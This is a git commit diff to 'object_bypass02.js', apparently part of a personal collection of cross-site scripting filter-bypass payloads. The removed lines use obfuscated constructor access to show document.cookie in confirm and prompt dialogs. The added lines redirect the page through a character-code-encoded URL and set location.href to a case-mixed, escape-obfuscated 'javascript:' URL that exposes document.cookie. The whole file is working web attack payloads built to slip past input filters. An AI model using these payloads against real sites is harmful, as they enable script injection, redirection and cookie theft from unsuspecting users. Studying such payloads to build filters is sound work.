4070f093a2a1b94ac5865492e1e0a75eada98702
LeeTaeYun <123449464+gituserYun@users.noreply.github.com>
2025-08-09 14:18:04 +0900

    Update object_bypass02.js

--- js/object_bypass02.js
+++ js/object_bypass02.js
@@ -1,4 +1,3 @@
-isNaN['constr'+'uctor'](confirm(document.cookie))
-[].constructor(prompt(document.cookie));
-(1).toString['constructor'](print());
-
+location.replace(String.fromCharCode(104,116,116,112,115,58,47,47,103,105,116,117,115,101,114,121,117,110,46,103,105,116,104,117,98,46,105,111))  // https://gituseryun.github.io
+location.href="JaVasCriPT:al\x65rt\u0028document.\u0063ookie\u0029"
+location['href']="https://gituseryun.github.io"
